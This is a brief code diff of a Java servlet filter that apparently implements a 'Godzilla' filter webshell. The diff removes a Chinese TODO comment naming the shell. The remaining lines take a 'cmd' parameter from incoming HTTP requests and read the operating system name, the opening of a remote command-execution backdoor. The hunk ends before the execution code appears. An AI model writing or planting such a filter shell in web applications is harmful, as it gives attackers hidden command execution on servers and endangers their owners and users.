@@ -12,7 +12,6 @@ public class MyFilter implements Filter {
     }
 
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        // TODO: 实现哥斯拉filter shell
         try {
             String cmd = servletRequest.getParameter("cmd");
             String osType = System.getProperty("os.name");
